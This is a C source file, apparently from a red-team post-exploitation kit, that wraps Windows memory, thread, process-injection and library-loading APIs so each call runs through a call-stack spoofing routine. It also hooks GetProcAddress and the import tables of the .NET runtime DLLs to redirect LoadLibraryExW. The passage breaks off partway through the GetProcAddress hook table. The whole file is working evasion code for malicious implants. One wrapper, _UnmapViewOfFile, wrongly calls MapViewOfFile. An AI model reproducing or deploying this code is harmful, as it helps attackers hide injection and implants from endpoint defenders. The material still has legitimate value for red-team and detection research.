/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include <wininet.h>
#include "hook.h"
#include "tcg.h"

/* store resolved functions */
void * g_ExitThread;

/* some globals */
MEMORY_LAYOUT g_layout;

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualAlloc\n");
    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize           : %d\n", dwSize);
    dprintf(" -> flAllocationType : %d\n", flAllocationType);
    dprintf(" -> flProtect        : %d\n", flProtect);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualAlloc);
    call.argc     = 4;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flAllocationType);
    call.args[3]  = (ULONG_PTR)(flProtect);

    return (LPVOID)draugr(&call);
}

LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualAllocEx\n");
    dprintf(" -> hProcess         : 0x%lp\n", hProcess);
    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize           : %d\n", dwSize);
    dprintf(" -> flAllocationType : %d\n", flAllocationType);
    dprintf(" -> flProtect        : %d\n", flProtect);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualAllocEx);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flAllocationType);
    call.args[4]  = (ULONG_PTR)(flProtect);

    return (LPVOID)draugr(&call);
}

BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualProtect\n");
    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize         : %d\n", dwSize);
    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualProtect);
    call.argc     = 4;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flNewProtect);
    call.args[3]  = (ULONG_PTR)(lpflOldProtect);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualProtectEx\n");
    dprintf(" -> hProcess       : 0x%lp\n", hProcess);
    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize         : %d\n", dwSize);
    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualProtectEx);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flNewProtect);
    call.args[4]  = (ULONG_PTR)(lpflOldProtect);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualFree\n");
    dprintf(" -> lpAddress  : 0x%lp\n", lpAddress);
    dprintf(" -> dwSize     : %d\n", dwSize);
    dprintf(" -> dwFreeType : %d\n", dwFreeType);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualFree);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(dwFreeType);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
{
    #if DEBUG
    dprintf("[POSTEX] _GetThreadContext\n");
    dprintf(" -> hThread   : 0x%lp\n", hThread);
    dprintf(" -> lpContext : 0x%lp\n", lpContext);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(GetThreadContext);
    call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
    call.args[1]  = (ULONG_PTR)(lpContext);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
{
    #if DEBUG
    dprintf("[POSTEX] _SetThreadContext\n");
    dprintf(" -> hThread   : 0x%lp\n", hThread);
    dprintf(" -> lpContext : 0x%lp\n", lpContext);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(SetThreadContext);
    call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
    call.args[1]  = (ULONG_PTR)(lpContext);

    return (BOOL)draugr(&call);
}

DWORD WINAPI _ResumeThread(HANDLE hThread)
{
    #if DEBUG
    dprintf("[POSTEX] _ResumeThread\n");
    dprintf(" -> hThread : 0x%lp\n", hThread);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(ResumeThread);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(hThread);

    return (DWORD)draugr(&call);
}

HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateThread\n");
    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(CreateThread);
    call.argc     = 6;
    call.args[0]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[1]  = (ULONG_PTR)(dwStackSize);
    call.args[2]  = (ULONG_PTR)(lpStartAddress);
    call.args[3]  = (ULONG_PTR)(lpParameter);
    call.args[4]  = (ULONG_PTR)(dwCreationFlags);
    call.args[5]  = (ULONG_PTR)(lpThreadId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateRemoteThread\n");
    dprintf(" -> hProcess           : 0x%lp\n", hProcess);
    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(CreateRemoteThread);
    call.argc     = 7;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[2]  = (ULONG_PTR)(dwStackSize);
    call.args[3]  = (ULONG_PTR)(lpStartAddress);
    call.args[4]  = (ULONG_PTR)(lpParameter);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpThreadId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    #if DEBUG
    dprintf("[POSTEX] _OpenProcess\n");
    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
    dprintf(" -> dwProcessId     : %d\n", dwProcessId);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(OpenProcess);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwProcessId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
{
    #if DEBUG
    dprintf("[POSTEX] _OpenThread\n");
    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
    dprintf(" -> dwThreadId      : %d\n", dwThreadId);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(OpenThread);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwThreadId);

    return (HANDLE)draugr(&call);
}

BOOL WINAPI _CloseHandle(HANDLE hObject)
{
    #if DEBUG
    dprintf("[POSTEX] _CloseHandle\n");
    dprintf(" -> hObject : 0x%lp\n", hObject);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(CloseHandle);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(hObject);

    return (BOOL)draugr(&call);
}

HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateFileMappingA\n");
    dprintf(" -> hFile                   : 0x%lp\n", hFile);
    dprintf(" -> lpFileMappingAttributes : 0x%lp\n", lpFileMappingAttributes);
    dprintf(" -> flProtect               : %d\n", flProtect);
    dprintf(" -> dwMaximumSizeHigh       : %d\n", dwMaximumSizeHigh);
    dprintf(" -> dwMaximumSizeLow        : %d\n", dwMaximumSizeLow);
    dprintf(" -> lpName                  : %s\n", lpName);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(CreateFileMappingA);
    call.argc     = 6;
    call.args[0]  = (ULONG_PTR)(hFile);
    call.args[1]  = (ULONG_PTR)(lpFileMappingAttributes);
    call.args[2]  = (ULONG_PTR)(flProtect);
    call.args[3]  = (ULONG_PTR)(dwMaximumSizeHigh);
    call.args[4]  = (ULONG_PTR)(dwMaximumSizeLow);
    call.args[5]  = (ULONG_PTR)(lpName);

    return (HANDLE)draugr(&call);
}

LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
{
    #if DEBUG
    dprintf("[POSTEX] _MapViewOfFile\n");
    dprintf(" -> hFileMappingObject   : 0x%lp\n", hFileMappingObject);
    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
    dprintf(" -> dwFileOffsetHigh     : %d\n", dwFileOffsetHigh);
    dprintf(" -> dwFileOffsetLow      : %d\n", dwFileOffsetLow);
    dprintf(" -> dwNumberOfBytesToMap : %d\n", dwNumberOfBytesToMap);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(MapViewOfFile);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hFileMappingObject);
    call.args[1]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[2]  = (ULONG_PTR)(dwFileOffsetHigh);
    call.args[3]  = (ULONG_PTR)(dwFileOffsetLow);
    call.args[4]  = (ULONG_PTR)(dwNumberOfBytesToMap);

    return (LPVOID)draugr(&call);
}

BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
{
    #if DEBUG
    dprintf("[POSTEX] _UnmapViewOfFile\n");
    dprintf(" -> lpBaseAddress : 0x%lp\n", lpBaseAddress);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(MapViewOfFile);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(lpBaseAddress);

    return (BOOL)draugr(&call);
}

SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
{
    #if DEBUG
    dprintf("[POSTEX] _VirtualQuery\n");
    dprintf(" -> lpAddress : 0x%lp\n", lpAddress);
    dprintf(" -> lpBuffer  : 0x%lp\n", lpBuffer);
    dprintf(" -> dwLength  : %d\n", dwLength);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(VirtualQuery);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(lpBuffer);
    call.args[2]  = (ULONG_PTR)(dwLength);

    return (SIZE_T)draugr(&call);
}

BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
{
    #if DEBUG
    dprintf("[POSTEX] _DuplicateHandle\n");
    dprintf(" -> hSourceProcessHandle : 0x%lp\n", hSourceProcessHandle);
    dprintf(" -> hSourceHandle        : 0x%lp\n", hSourceHandle);
    dprintf(" -> hTargetProcessHandle : 0x%lp\n", hTargetProcessHandle);
    dprintf(" -> lpTargetHandle       : 0x%lp\n", lpTargetHandle);
    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
    dprintf(" -> bInheritHandle       : %d\n", bInheritHandle);
    dprintf(" -> dwOptions            : %d\n", dwOptions);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(DuplicateHandle);
    call.argc     = 7;
    call.args[0]  = (ULONG_PTR)(hSourceProcessHandle);
    call.args[1]  = (ULONG_PTR)(hSourceHandle);
    call.args[2]  = (ULONG_PTR)(hTargetProcessHandle);
    call.args[3]  = (ULONG_PTR)(lpTargetHandle);
    call.args[4]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[5]  = (ULONG_PTR)(bInheritHandle);
    call.args[6]  = (ULONG_PTR)(dwOptions);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)
{
    #if DEBUG
    dprintf("[POSTEX] _ReadProcessMemory\n");
    dprintf(" -> hProcess            : 0x%lp\n", hProcess);
    dprintf(" -> lpBaseAddress       : 0x%lp\n", lpBaseAddress);
    dprintf(" -> lpBuffer            : 0x%lp\n", lpBuffer);
    dprintf(" -> nSize               : %d\n", nSize);
    dprintf(" -> lpNumberOfBytesRead : 0x%lp\n", lpNumberOfBytesRead);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(ReadProcessMemory);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesRead);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)
{
    #if DEBUG
    dprintf("[POSTEX] _WriteProcessMemory\n");
    dprintf(" -> hProcess               : 0x%lp\n", hProcess);
    dprintf(" -> lpBaseAddress          : 0x%lp\n", lpBaseAddress);
    dprintf(" -> lpBuffer               : 0x%lp\n", lpBuffer);
    dprintf(" -> nSize                  : %d\n", nSize);
    dprintf(" -> lpNumberOfBytesWritten : 0x%lp\n", lpNumberOfBytesWritten);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(WriteProcessMemory);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesWritten);

    return (BOOL)draugr(&call);
}

DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
{
    #if DEBUG
    dprintf("[POSTEX] _ExitThread\n");
    dprintf(" -> dwExitCode : %d\n", dwExitCode);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(g_ExitThread);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(dwExitCode);

    draugr(&call);
}

BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
    #if DEBUG
    dprintf("[POSTEX] _CreateProcessA\n");
    dprintf(" -> lpApplicationName    : %s\n", lpApplicationName);
    dprintf(" -> lpCommandLine        : %s\n", lpCommandLine);
    dprintf(" -> lpProcessAttributes  : 0x%lp\n", lpProcessAttributes);
    dprintf(" -> lpThreadAttributes   : 0x%lp\n", lpThreadAttributes);
    dprintf(" -> bInheritHandles      : %d\n", bInheritHandles);
    dprintf(" -> dwCreationFlags      : %d\n", dwCreationFlags);
    dprintf(" -> lpEnvironment        : 0x%lp\n", lpEnvironment);
    dprintf(" -> lpCurrentDirectory   : %s\n", lpCurrentDirectory);
    dprintf(" -> lpStartupInfo        : 0x%lp\n", lpStartupInfo);
    dprintf(" -> lpProcessInformation : 0x%lp\n", lpProcessInformation);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(CreateProcessA);
    call.argc     = 10;
    call.args[0]  = (ULONG_PTR)(lpApplicationName);
    call.args[1]  = (ULONG_PTR)(lpCommandLine);
    call.args[2]  = (ULONG_PTR)(lpProcessAttributes);
    call.args[3]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[4]  = (ULONG_PTR)(bInheritHandles);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpEnvironment);
    call.args[7]  = (ULONG_PTR)(lpCurrentDirectory);
    call.args[8]  = (ULONG_PTR)(lpStartupInfo);
    call.args[9]  = (ULONG_PTR)(lpProcessInformation);

    return (BOOL)draugr(&call);
}

VOID WINAPI _Sleep(DWORD dwMilliseconds)
{
    #if DEBUG
    dprintf("[POSTEX] _Sleep\n");
    dprintf(" -> dwMilliseconds : %d\n", dwMilliseconds);
    #endif

    /* only stack spoof if sleep is >= 1s */
    if (dwMilliseconds < 1000) {
        Sleep(dwMilliseconds);
        return;
    }
    
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(Sleep);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(dwMilliseconds);
    
    draugr(&call);
}

HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)
{
    #if DEBUG
    dprintf("[POSTEX] _LoadLibraryExW\n");
    dprintf(" -> lpLibFileName : %S\n", lpLibFileName);
    dprintf(" -> hFile         : 0x%p\n", hFile);
    dprintf(" -> dwFlags       : %d\n", dwFlags);
    #endif

    /* spoof the call */
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(LoadLibraryExW);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpLibFileName);
    call.args[1]  = (ULONG_PTR)(hFile);
    call.args[2]  = (ULONG_PTR)(dwFlags);

    /* hold the result */
    HMODULE result = (HMODULE)draugr(&call);

    /* check to see if it's mscoreei.dll */
    LPCWSTR back = MSVCRT$wcsrchr(lpLibFileName, L'\\');
    LPCWSTR fwd  = MSVCRT$wcsrchr(lpLibFileName, L'/');
    LPCWSTR name = back > fwd ? back : fwd;
    
    if (name) { name++; }        
    else { name = lpLibFileName; }

    if (MSVCRT$_wcsicmp(name, L"mscoreei.dll") == 0)
    {
        /* walk the IAT and hook LoadLibraryExW */
        PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)result;
        PIMAGE_NT_HEADERS ntHeaders  = (PIMAGE_NT_HEADERS)((DWORD_PTR)result + dosHeaders->e_lfanew);

        IMAGE_DATA_DIRECTORY importsDirectory     = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)result);

        while (importDescriptor->Name != 0)
        {
            PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)result + importDescriptor->OriginalFirstThunk);
            PIMAGE_THUNK_DATA firstThunk         = (PIMAGE_THUNK_DATA)((DWORD_PTR)result + importDescriptor->FirstThunk);

            while (originalFirstThunk->u1.AddressOfData != 0)
            {
                PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)result + originalFirstThunk->u1.AddressOfData);
                DWORD h = hash((char *)(functionName->Name));
                
                if (h == LOADLIBRARYEXW_HASH)
                {
                    DWORD oldProtect = 0;

                    if (_VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect))
                    {
                        firstThunk->u1.Function = (DWORD_PTR)(_LoadLibraryExW);
                        _VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, oldProtect, &oldProtect);
                    }

                    break;
                }

                ++originalFirstThunk;
                ++firstThunk;
            }

            importDescriptor++;
        }
    }

    return result;
}

HMODULE WINAPI _LoadLibraryW(LPCWSTR lpLibFileName)
{
    #if DEBUG
    dprintf("[POSTEX] _LoadLibraryW\n");
    dprintf(" -> lpLibFileName : %S\n", lpLibFileName);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(LoadLibraryW);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(lpLibFileName);

    /* hold the result */
    HMODULE result = (HMODULE)draugr(&call);

    /* was this mscoree.dll? */
    if (MSVCRT$_wcsicmp(lpLibFileName, L"mscoree.dll") == 0)
    {
        /* parse the module's headers */
        PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)result;
        PIMAGE_NT_HEADERS ntHeaders  = (PIMAGE_NT_HEADERS)((DWORD_PTR)result + dosHeaders->e_lfanew);

        /* get the import directory */
        IMAGE_DATA_DIRECTORY importsDirectory     = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)result);

        /* walk every imported module */
        while (importDescriptor->Name != 0)
        {
            PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)result + importDescriptor->OriginalFirstThunk);
            PIMAGE_THUNK_DATA firstThunk         = (PIMAGE_THUNK_DATA)((DWORD_PTR)result + importDescriptor->FirstThunk);

            /* walk every imported function */
            while (originalFirstThunk->u1.AddressOfData != 0)
            {
                PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)result + originalFirstThunk->u1.AddressOfData);
                DWORD h = hash((char *)(functionName->Name));

                /* is the imported function LoadLibraryExW? */
                if (h == LOADLIBRARYEXW_HASH)
                {
                    /* yep, hook it */
                    DWORD oldProtect = 0;
                    if (_VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect))
                    {
                        firstThunk->u1.Function = (DWORD_PTR)(_LoadLibraryExW);
                        _VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, oldProtect, &oldProtect);
                    }

                    break;
                }

                ++originalFirstThunk;
                ++firstThunk;
            }

            importDescriptor++;
        }
    }

    /* now return the module */
    return result;
}

HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName)
{
    #if DEBUG
    dprintf("[POSTEX] _LoadLibraryA\n");
    dprintf(" -> lpLibFileName : %s\n", lpLibFileName);
    #endif

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(LoadLibraryA);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(lpLibFileName);

    return (HMODULE)draugr(&call);
}

char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    char * result = (char *)GetProcAddress(hModule, lpProcName);

    /*
    * Check to see what function is being resolved.
    * Note that lpProcName may be an ordinal, not a string.
    */

    if ((ULONG_PTR)lpProcName >> 16 == 0) {
        /* it's an ordinal */
        return result;
    }

    /* Look at the ones we want to hook */

    /* Calculte function hash */
    DWORD h = hash((char *)lpProcName);

    if (h == GETPROCADDRESS_HASH) {
        return (char *)_GetProcAddress;
    }
    else if (h == LOADLIBRARYA_HASH) {
        return (char *)_LoadLibraryA;
    }
    else if (h == LOADLIBRARYW_HASH) {
        return (char *)_LoadLibraryW;
    }
    else if (h == LOADLIBRARYEXW_HASH) {
        return (char*)_LoadLibraryExW;
    }
    else if (h == VIRTUALALLOC_HASH) {
        return (char *)_VirtualAlloc;
    }
    else if (h == VIRTUALALLOCEX_HASH) {
        return (char *)_VirtualAllocEx;
    }
    else if (h == VIRTUALPROTECT_HASH) {
        return (char *)_VirtualProtect;
    }
    else if (h == VIRTUALPROTECTEX_HASH) {
        return (char *)_VirtualProtectEx;
    }
    else if (h == VIRTUALFREE_HASH) {
        return (char *)_VirtualFree;
    }
    else if (h == GETTHREADCONTEXT_HASH) {
        return (char *)_GetThreadContext;
    }
    else if (h == SETTHREADCONTEXT_HASH) {
        return (char *)_SetThreadContext;
    }
    else if (h == RESUMETHREAD_HASH) {
        return (char *)_ResumeThread;
    }
    else if (h == CREATETHREAD_HASH) {
        return (char *)_CreateThread;
    }
    else if (h == CREATEREMOTETHREAD_HASH) {
        return (char *)_CreateRemoteThread;
    }
    else if (h == OPENPROCESS_HASH) {
        return (char *)_OpenProcess;
    }
    else if (h == OPENTHREAD_HASH) {
        return (char *)_OpenThread;
    }
    else if (h == CLOSEHANDLE_HASH) {
